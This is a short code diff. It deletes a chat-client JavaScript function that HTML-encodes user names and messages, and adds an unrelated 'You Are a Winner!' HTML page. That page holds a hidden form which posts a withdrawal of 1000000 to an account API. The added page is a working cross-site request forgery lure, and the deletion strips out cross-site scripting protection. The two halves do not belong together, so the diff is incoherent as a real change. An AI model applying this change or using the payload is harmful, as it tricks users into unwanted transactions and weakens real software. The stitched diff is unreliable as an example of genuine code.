@@ -1,8 +1,6 @@
-chat.client.addMessageToPage = function (name, message) {
-    // Html encode display name and message. 
-    var encodedName = $('<div />').text(name).html();
-    var encodedMsg = $('<div />').text(message).html();
-    // Add the message to the page. 
-    $('#discussion').append('<li><strong>' + encodedName
-        + '</strong>:  ' + encodedMsg + '</li>');
-};
+        <h1>You Are a Winner!</h1>
+        <form action="http://example.com/api/account" method="post">
+            <input type="hidden" name="Transaction" value="withdraw" />
+            <input type="hidden" name="Amount" value="1000000" />
+            <input type="submit" value="Click Me"/>
+        </form>
